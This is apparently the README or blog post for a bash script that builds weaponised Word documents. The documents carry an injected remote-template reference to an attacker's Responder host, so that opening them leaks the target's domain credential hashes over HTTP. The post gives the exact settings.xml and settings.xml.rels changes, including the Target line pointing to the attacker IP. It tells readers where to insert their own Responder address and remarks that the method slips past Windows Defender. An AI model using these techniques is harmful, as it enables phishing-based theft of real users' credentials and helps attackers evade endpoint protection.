        ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |  I LOVE SMB!    |  |  |     |         |      |
     |  |  HTTP better    |  |  |/----|`---=    |      |
     |  |  C:\>_          |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [78]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)h     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"

Ever since I discovered SMB requests can be injected into office docs I have been obsessed with the idea. 

Years back a friend told me that you can replace SMB with a HTTP request, and it results in domain credentials been sent in the same way but over HTTP. All testing of HTTP resulted in a authentication prompt been executed on the targets machine, while not ideal as it requires the user to type in their own credentials it does work as a fall back option were targets don’t use IE or block SMB outbound.

Then I discovered https://github.com/ryhanson/phishery this documented a different way to inject the HTTP request into a word document, now while the tool when used as intended still executes a prompt on the targets machine, it does result in the snagged creds been in cleartext, so some may find it of use. 
I labbed with the tool and noticed that the weaponised docs when pointed at responder resulted in hash been sent over HTTP without any prompt for credentials, replicating SMB exploration. This intrigued me, so I wanted to figure out how the tool created the weaponised doc.

To review the output I created a weaponised doc, changed the file format from docx to a zip, then opened the doc with winrar, inside the /word/ directory phishery added a reference number of <w:attachedTemplate r:id="rId1337"/> to the settings.xml file and in addition in side the _rels directory it creates an additional file called settings.xml.rels this file contains the reference to the IP address of the defined responder box Target="http://192.168.1.20/docs1

I wanted to see if I could create my own bash script to create word docs with an injected HTTP request. This script is the output of this.
To use simply copy the script to kali then open it and under the settings.xml.rels creation section simply add the IP address of your responder box were it says http://ADD-Your_Responder_IP-Here/docs1. I tried to automate this section but due to using an echo I couldn’t figure out how to prompt for an IP address then inject it in, so just manually add one till I figure it out ;0)


Now for the but there’s a snag, SEP picks up this method and blocks the outbound request, but it sails past defender ;0)
